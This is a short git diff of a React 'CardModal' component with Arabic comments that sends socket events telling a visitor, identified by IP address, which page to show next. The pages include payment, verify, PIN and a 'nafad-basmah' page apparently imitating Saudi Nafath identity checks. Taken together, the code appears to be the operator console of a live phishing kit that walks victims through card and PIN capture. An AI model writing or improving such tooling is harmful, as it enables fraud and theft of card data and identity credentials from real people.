@@ -75,19 +75,12 @@ export default function CardModal({ ip, user, onClose }) {
     setBasmah("");
   };
 
-  // صفحات لها صفحة تالية ثابتة عند yes
-  const NEXT_PAGE = {
-    "paymen.html": "verify.html",
-    "verify.html": "pin.html",
-  };
-
   const handleConfirm = () => {
+    // لو الصفحة nafad-basmah نرسل الرقم أولاً قبل التنقل
     if (confirm.page === "nafad-basmah.html" && basmah) {
       socket.emit("updateBasmah", { ip, basmah: Number(basmah) });
     }
-    // إذا الصفحة المختارة عندها صفحة تالية ثابتة، أرسل الصفحة التالية
-    const nextPage = NEXT_PAGE[confirm.page] || confirm.page;
-    socket.emit("navigateTo", { ip, page: nextPage });
+    socket.emit("navigateTo", { ip, page: confirm.page });
     hideConfirm();
   };
 
